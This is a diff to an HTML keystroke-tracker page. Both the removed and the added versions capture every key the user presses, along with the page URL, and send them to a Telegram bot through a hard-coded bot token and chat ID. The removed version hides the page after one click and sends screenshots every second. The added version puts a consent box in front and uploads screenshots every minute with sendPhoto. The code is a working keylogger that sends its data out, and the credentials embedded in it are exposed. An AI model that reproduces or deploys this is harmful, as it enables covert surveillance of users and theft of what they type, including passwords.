@@ -3,23 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keystroke Tracker with Screenshot</title>
+    <title>Keystroke Tracker (Transparent)</title>
     <style>
         body {
-            display: block; /* Page is visible initially */
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+            background-color: #f9f9f9;
         }
-        #startLink {
-            cursor: pointer;
-            color: blue;
-            text-decoration: underline;
+        #consent {
+            display: block;
+            padding: 20px;
+            border: 1px solid #ccc;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        #tracking-active {
+            display: none;
         }
     </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script> <!-- Include html2canvas library -->
-    <script>
-        const BOT_TOKEN = '7738754119:AAFpllyK3lvfi2EWgxQgsVpQA-t1GxAeg4Y';  // Replace with your Telegram Bot Token
-        const CHAT_ID = '6482794683';  // Replace with your Telegram chat ID
+    <!-- Include html2canvas -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</head>
+<body>
+    <div id="consent">
+        <h2>Keystroke and Screenshot Tracker</h2>
+        <p>This page captures keystrokes and takes a screenshot every minute for testing and educational purposes. All data will be sent to a Telegram bot. By proceeding, you consent to this tracking.</p>
+        <button onclick="startTracking()">I Agree and Start</button>
+    </div>
+    <div id="tracking-active">
+        <h2>Tracking in Progress</h2>
+        <p>Your keystrokes are being captured, and screenshots will be taken every minute.</p>
+    </div>
 
-        // Function to send captured keystrokes to Telegram Bot
+    <script>
+        const BOT_TOKEN = '7738754119:AAFpllyK3lvfi2EWgxQgsVpQA-t1GxAeg4Y'; // Replace with your bot token
+        const CHAT_ID = '6482794683'; // Replace with your chat ID
+
         function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
@@ -33,58 +56,56 @@
                     text: message,
                 }),
             })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Message sent to Telegram:', data);
-            })
-            .catch(error => {
-                console.error('Error sending to Telegram:', error);
-            });
+            .then(response => console.log('Message sent:', response))
+            .catch(error => console.error('Error:', error));
         }
 
-        // Function to capture keystrokes
+        function uploadImageToTelegram(imageBase64) {
+            const formData = new FormData();
+            const byteCharacters = atob(imageBase64.split(',')[1]);
+            const byteArrays = [];
+
+            for (let offset = 0; offset < byteCharacters.length; offset++) {
+                const byte = byteCharacters.charCodeAt(offset);
+                byteArrays.push(byte);
+            }
+
+            const byteArray = new Uint8Array(byteArrays);
+            const file = new Blob([byteArray], { type: 'image/png' });
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file, 'screenshot.png');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => console.log('Image sent to Telegram:', response))
+            .catch(error => console.error('Error uploading image to Telegram:', error));
+        }
+
         function captureKeystrokes() {
             document.addEventListener('keydown', (event) => {
-                const keystroke = event.key; // Capture the key pressed
-                sendToTelegram(`Captured Keystroke: ${keystroke}`);  // Send keystroke to Telegram
+                const keystroke = event.key;
+                const currentUrl = window.location.href;
+                sendToTelegram(`Captured Keystroke: ${keystroke} | URL: ${currentUrl}`);
             });
         }
 
-        // Function to take a screenshot of the page
         function takeScreenshot() {
-            html2canvas(document.body).then(function(canvas) {
-                const screenshotDataUrl = canvas.toDataURL('image/png');
-                
-                // Send screenshot to Telegram
-                sendToTelegram('Screenshot of the page:'); // Notify the screenshot capture
-                // You might want to encode large data differently instead of sending the image base64 directly.
-                console.log('Screenshot captured.');
+            html2canvas(document.body, { useCORS: true }).then((canvas) => {
+                const imageBase64 = canvas.toDataURL('image/png');
+                uploadImageToTelegram(imageBase64);
             });
         }
 
-        // Function to start the tracking without delay
         function startTracking() {
-            document.body.style.display = 'none';  // Hide the page immediately
-            captureKeystrokes();  // Start capturing keystrokes immediately
-            
-            // Set an interval to take a screenshot every 1 second
+            document.getElementById('consent').style.display = 'none';
+            document.getElementById('tracking-active').style.display = 'block';
+            captureKeystrokes();
             setInterval(() => {
-                takeScreenshot();  // Take a screenshot
-            }, 1000);
+                takeScreenshot();
+            }, 60000); // Take a screenshot every minute
         }
-
-        // Event listener for the link click
-        document.addEventListener("DOMContentLoaded", function() {
-            const startLink = document.getElementById("startLink");
-            startLink.addEventListener("click", function() {
-                startTracking();
-            });
-        });
     </script>
-</head>
-<body>
-    <h1>Keystroke Tracker Running in Background</h1>
-    <p>Click the link below to start the tracker:</p>
-    <p id="startLink">Click here to start tracking keystrokes and take a screenshot every second!</p>
 </body>
 </html>
